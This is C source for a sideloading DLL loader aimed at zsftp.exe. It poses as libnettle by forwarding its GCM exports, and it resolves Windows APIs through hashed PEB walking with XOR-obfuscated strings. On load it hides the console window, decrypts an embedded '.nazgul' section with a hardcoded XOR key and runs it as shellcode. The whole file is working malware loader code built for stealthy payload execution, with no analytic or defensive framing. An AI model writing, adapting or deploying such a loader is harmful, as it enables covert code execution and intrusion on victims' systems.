#include "SideeLoader.h"

#define __forceinline __attribute__( ( always_inline ) )

_Noreturn LoadSc( );
int __strcmp(const char* String1, const char* String2);
PVOID __memcpy(PVOID Destination, CONST PVOID Source, SIZE_T Length);
SIZE_T __strlenw(LPCWSTR String);
SIZE_T __strlen(LPCSTR String);
SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );
PPEB NtObfuscatedPeb( VOID );
void _RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source);
/* 
typedef int (WINAPI* wWinMain_t)(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow);
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

typedef BOOL(*EXPORTFUNC)( VOID );
*/

Instance xInstance = { 0 };

/* Exported for zsftp.exe sideloading */
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes128_decrypt=libneltte-8.nettle_gcm_aes128_decrypt @27\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes128_digest=libneltte-8.nettle_gcm_aes128_digest @279\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes128_encrypt=libneltte-8.nettle_gcm_aes128_encrypt @280\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes128_set_iv=libneltte-8.nettle_gcm_aes128_set_iv @281\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes128_set_key=libneltte-8.nettle_gcm_aes128_set_key @282\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes128_update=libneltte-8.nettle_gcm_aes128_update @283\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes256_decrypt=libneltte-8.nettle_gcm_aes256_decrypt @292\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes256_digest=libneltte-8.nettle_gcm_aes256_digest @293\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes256_encrypt=libneltte-8.nettle_gcm_aes256_encrypt @294\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes256_set_iv=libneltte-8.nettle_gcm_aes256_set_iv @295\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes256_set_key=libneltte-8.nettle_gcm_aes256_set_key @296\"");
asm (".section .drectve\n\t.ascii \" -export:nettle_gcm_aes256_update=libneltte-8.nettle_gcm_aes256_update @297\"");

PPEB NtObfuscatedPeb( VOID ){

    volatile unsigned char Seed = 3;

    volatile PVOID Teb = ( PVOID ) __readgsqword( ( DWORD )( ( ULONG_PTR ) Seed << 4 ) );
    PPEB           Peb = ( PPEB ) *( PVOID* ) ( ( PUCHAR ) Teb + ( ( ULONG_PTR ) Seed << 5 ) );

    return Peb;
}


SIZE_T CharStringToWCharString(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed)
{
    INT Length = MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}


void _RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source)
{
	if ((target->Buffer = (PWSTR)source))
	{
		unsigned int length = __strlenw(source) * sizeof(WCHAR);
		if (length > 0xfffc)
			length = 0xfffc;

		target->Length = length;
		target->MaximumLength = target->Length + sizeof(WCHAR);
	}
	else target->Length = target->MaximumLength = 0;
}


WCHAR* ToLowerW(WCHAR* str) {

    WCHAR* start = str;

    while (*str) {
        if (*str <= L'Z' && *str >= 'A') {
            *str += 32;
        }

        str += 1;
    }

    return start;
}

int __strcmpw( const wchar_t* s1, const wchar_t* s2 ) {
    while (*s1 == *s2++)
        if (*s1++ == '\0')
            return (0);

    return (*(const unsigned int*)s1 - *(const unsigned int*)--s2);
}

int __strcmp( const char* String1, const char* String2 ){
    while (*String1)
    {
        if (*String1 != *String2) {
            break;
        }
        String1++;
        String2++;
    }
    return *(const unsigned char*)String1 - *(const unsigned char*)String2;
}

PVOID __memcpy(PVOID Destination, CONST PVOID Source, SIZE_T Length){
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

SIZE_T __strlenw(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);
    return (String2 - String);
}

VOID __memset(PVOID Destination, int Val, SIZE_T Size)
{
    PULONG Dest = ( PULONG )Destination;
    SIZE_T Count = Size / sizeof( ULONG );

    while ( Count > 0 )
    {
        *Dest = Val;
        Dest++;
        Count--;
    }
}

SIZE_T __strlen(LPCSTR String)
{
    LPCSTR String2 = String;

    for (String2 = String; *String2; ++String2);
    return (String2 - String);
}


/*!
 * Custom 32-bit string hasher (DJB2-XOR + rotate variant).
 * @param String  Pointer to the bytes to hash.
 * @param Length  Byte length, or 0 to hash until NUL.
 * @param Upper   If TRUE, fold ASCII lowercase to uppercase before mixing.
 * @return        32-bit hash.
 */
ULONG HashEx(
      IN PVOID String,
      IN ULONG Length,
      IN BOOL  Upper
) {
      ULONG  Hash = CUSTOM_HASH_SEED;
      PUCHAR Ptr  = String;
      UCHAR  character;

      if ( ! String ) return 0;

      do {
          if ( ! Length ) {
              if ( ! *Ptr ) break;
              character = *Ptr;
          } else {
              if ( (ULONG)( Ptr - (PUCHAR)String ) >= Length ) break;
              character = *Ptr;
              if ( ! character ) {                       /* skip zero byte of wide char */
                  ++Ptr;
                  if ( (ULONG)( Ptr - (PUCHAR)String ) >= Length ) break;
                  character = *Ptr;
              }
          }

          if ( Upper && character >= 'a' && character <= 'z' )
              character -= 0x20;

          Hash = ( ( Hash << 5 ) + Hash ) ^ character;
          Hash = ROTL32( Hash, 13 );

          ++Ptr;
      } while ( TRUE );

      return Hash;
  }

 /*
*   Chained XOR decryption with byte-feedback key schedule.
*   Encryption (reference, used by scripts/encrypt_string.py):
*/
__forceinline VOID DecryptString( PUCHAR Buffer, INT BufferSize )
{

    UCHAR Key = 0xA7;
    UCHAR Enc = 0x00;
    INT   i   = 0;

    for ( i = 0; i < BufferSize; i++ ) {
        Enc         = Buffer[ i ];
        Buffer[ i ] = Enc ^ Key;
        Key         = ( UCHAR )( Key + Enc + ( UCHAR )i );
    }
}

/*!
 * gets the function pointer
 * @param Module
 * @param FunctionHash
 * @return
 * 
 * Resolve function pointer given the hash value and the module 
 */
PVOID LdrFunctionAddr(
    IN PVOID     Module,
    IN DWORD     Hash,
    IN PINSTANCE Instance
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PVOID                   FunctionAddr     = { 0 };
    PCHAR                   FunctionName     = { 0 };
    ANSI_STRING             AnsiString       = { 0 };

    if ( ! Module || ! Hash )
        return NULL;

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( HashEx( FunctionName, 0, TRUE ) == Hash )
        {
            FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );

            /* if this is a redirect function then use LdrGetProcedureAddress */
            if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
                 ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
            {
                AnsiString.Length        = __strlen( FunctionName );
                AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                AnsiString.Buffer        = FunctionName;

                if ( Instance->Win32.LdrGetProcedureAddress ) {
                    if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) ) {
                        return NULL;
                    }
                } else {
                    return NULL;
                }
            }

            return FunctionAddr;
        }
    }
    return NULL;
}

/*!
 * load module from PEB InLoadOrderModuleList by Hash
 * @param Hash
 * @return
 * 
 * Resolve module from InLoadOrderModuleList by comparing the hash 
 */
PVOID LdrModulePeb(
    IN DWORD Hash
) {
    PLDR_DATA_TABLE_ENTRY1 Ldr = NULL;
    PLIST_ENTRY		      Hdr = NULL;
    PLIST_ENTRY		      Ent = NULL;
    PPEB			      Peb = NULL;

    // Get PEB 
    Peb = NtObfuscatedPeb();
    Hdr = & ( ( PFULL_PEB_LDR_DATA ) Peb->pLdr )->InLoadOrderModuleList;
    Ent = Hdr->Flink;

    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
        Ldr = C_PTR( Ent );

        /* Compare the DLL Name! */
        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
            return Ldr->DllBase;
        }
    }

    return NULL;
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        UCHAR  Ntdll_c[ ] = { 0xc9, 0x04, 0x11, 0xe4, 0x03, 0x58, 0xb7, 0xfc, 0xff, 0x00 };
        HANDLE hThread    = NULL;

        __memset( &xInstance, 0, sizeof( xInstance ) );

        DecryptString( Ntdll_c, sizeof( Ntdll_c ) - 1 );
        xInstance.Lib.hNtdll = LdrModulePeb( HashEx( Ntdll_c, 0, TRUE ) );
        __memset( Ntdll_c, 0, sizeof( Ntdll_c ) );

        xInstance.$NTDLL.RtlCreateUserThread = LdrFunctionAddr( xInstance.Lib.hNtdll, HASH_RTLCREATEUSERTHREAD, &xInstance );
        xInstance.$NTDLL.NtClose             = LdrFunctionAddr( xInstance.Lib.hNtdll, HASH_NTCLOSE, &xInstance );

        if ( xInstance.$NTDLL.RtlCreateUserThread && xInstance.$NTDLL.NtClose ) {
            xInstance.$NTDLL.RtlCreateUserThread( ( HANDLE ) -1, NULL, FALSE, 0, 0, 0, ( PTHREAD_START_ROUTINE ) LoadSc, NULL, &hThread, NULL );
            if ( hThread )
                xInstance.$NTDLL.NtClose( hThread );
        }
        break;
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


_Noreturn LoadSc( ){


    PVOID   SecMem = 0;
    PVOID	SecMemSize = 0;
    DWORD	OldProtection = 0;

    UCHAR libnettle_8[ ] = { 0xcb, 0x1b, 0xec, 0x12, 0xf4, 0xfd, 0xff, 0xfc, 0xf6, 0xbc, 0x6e, 0xe0, 0xdd, 0xce, 0x11, 0x00 };
    UCHAR User32_c[ ]    = { 0xd2, 0x0a, 0xe1, 0x15, 0x4c, 0xfd, 0xff, 0xb2, 0xe3, 0x16, 0x00 };
    unsigned char Key[]         = { 0x63, 0x24, 0x9F, 0x18, 0xC0, 0x5D, 0xE7, 0xB2 };

    DecryptString( libnettle_8, sizeof( libnettle_8 ) - 1 );
    DecryptString( User32_c, sizeof( User32_c ) - 1 );

    PVOID pBaseAddr = LdrModulePeb( HashEx( libnettle_8, 0, TRUE ) );
    xInstance.Lib.hUser32 = LdrModulePeb( HashEx( User32_c, 0, TRUE ) );

    __memset( libnettle_8, 0, sizeof( libnettle_8 ));
    __memset( User32_c, 0, sizeof( User32_c ) );

    /* hide the cmd window */
    if ( xInstance.Lib.hUser32 ){
        
        xInstance.$USER32.GetForegroundWindow = LdrFunctionAddr( xInstance.Lib.hUser32, HASH_GETFOREGROUNDWINDOW, &xInstance );
        xInstance.$USER32.ShowWindow = LdrFunctionAddr( xInstance.Lib.hUser32, HASH_SHOWWINDOW, &xInstance );
        
        if ( xInstance.$USER32.GetForegroundWindow != NULL && xInstance.$USER32.ShowWindow != NULL ){
            HWND hWnd = xInstance.$USER32.GetForegroundWindow( );
            xInstance.$USER32.ShowWindow( hWnd, SW_HIDE );
        }
    }

    IMAGE_DOS_HEADER* pDosHdr = ( IMAGE_DOS_HEADER* ) pBaseAddr;
    IMAGE_NT_HEADERS* pNTHdr = ( IMAGE_NT_HEADERS* ) ( pBaseAddr + pDosHdr->e_lfanew );
    IMAGE_SECTION_HEADER* pSection = ( ( PIMAGE_SECTION_HEADER ) ( ( PBYTE ) &pNTHdr->OptionalHeader + pNTHdr->FileHeader.SizeOfOptionalHeader ) );

    /* enumerate sections in our dll */
    for ( UINT32 i = 0; i < pNTHdr->FileHeader.NumberOfSections; i++, pSection++ ) {

        if ( __strcmp( pSection->Name,".nazgul" ) == 0 ) {
            
            SecMem = VirtualAlloc( NULL, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
            SecMemSize = pSection->SizeOfRawData;

            __memcpy( SecMem, pBaseAddr + pSection->VirtualAddress, SecMemSize );

            for ( SIZE_T i = 0; i < ( SIZE_T ) SecMemSize; i++ )
                ( ( PUCHAR ) SecMem )[ i ] ^= Key[ i % sizeof( Key ) ];
            
            break;
        }
    }

    if ( SecMem != NULL ){

        if( VirtualProtect( SecMem, SecMemSize, PAGE_EXECUTE_READ, &OldProtection ) ){
        
            ( ( void( * ) ( ) ) SecMem )( );
    
        }

    }
    
}
